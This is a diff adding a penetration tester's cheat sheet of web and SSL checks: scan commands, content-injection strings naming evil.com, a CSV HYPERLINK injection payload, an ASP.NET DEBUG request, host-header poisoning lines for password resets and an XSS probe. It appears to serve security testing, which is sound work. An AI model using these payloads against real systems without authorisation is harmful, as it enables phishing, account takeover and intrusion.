@@ -1,0 +1,88 @@
+SSL Commands
+
+ Beast Attack and Crime Attack
+Java -jar testsslserver.jar domain
+Sweet32
+nmap -sV -p 443 --script ssl-enum-ciphers <DOM>
+Poodle attack
+nmap -sV --version-light --script ssl-poodle -p 443 <DOM>
+
+Robot attack -
+ssylze --robot domain
+
+Reneg
+sslyze --reneg domain
+
+ROBOT 
+
+sslyze --regular DN 
+
+
+
+**************************************************
+for forbidden (Predictable resource locatio)
+use /.htmaccess or /.htaccess & trace.axd
+
+
+htaccess is a configuration file for use on web servers running the Apache Web Server software. When a . htaccess file is placed in a directory which is in turn 'loaded via the Apache Web Server', then the . htaccess file is detected and executed by the Apache Web Server software.
+
+*.htaccess files provide a way to make configuration changes on a per-directory basis.
+**************************************************
+For Content Injection
+!!!Dear%20user/Please%20Visit%20www.evil.com 
+!!!Dear%20user/Please%20Visit%20www.evil.com......Thanks
+%20is%20moved%20on%20different%20location.%20Please%20visit%20our%20new%20site%20WWW.EVIL.com%20for%20further%20details%20on%20this%20server
+/plzvisitevil.com
+
+
+**************************************************
+TT
+
+https://github.com/daffainfo/AllAboutBugBounty/
+https://github.com/dubey-amit/cheatsheet/blob/6c35f0c56e565239ae8b3cef66a05aee0ed7e8b4/XSS.MD
+https://www.xmind.net/m/2FwJ7D/  (Cookie Based )
+
+******************************************************
+Application's Apache Server - Status Enabled
+domain/server-status
+
+*********************************************
+
+ Weak cipher/encoding
+
+https://www.devglan.com/online-tools/triple-des-encrypt-decrypt
+
+********************************************
+CSV injection
+Payload
+=HYPERLINK("https://www.evil.com/","HACKED")
+
+********************************************************
+ASP.NET debugging is enabled
+
+DEBUG /foo.aspx HTTP/1.0
+Accept: */*
+Host: www.example.com
+Command: stop-debug
+***************************
+Reference
+https://payatu.com/csv-injection-basic-to-exploit
+
+**************************************
+Reset Password:-
+https://0xayub.gitbook.io/blog/#7-reset-link-expiration
+
+Host: evil.com
+X-Forwarded-For: evil.com
+X-Forwarded-Host: evil.com
+X-Client-IP: evil.com
+X-Originating-IP: evil.com
+
+*******************************
+XSS
+'-confirm(123)'
+
+******************************
+Sqlmap
+https://abrictosecurity.com/blog/sqlmap-cheatsheet-and-examples/
+https://securityonline.info/sqlmap-tamper-script-bypassing-waf/#:~:text=You%20can%20define%20your%20own,%22between%2Crandomcase%22%20).
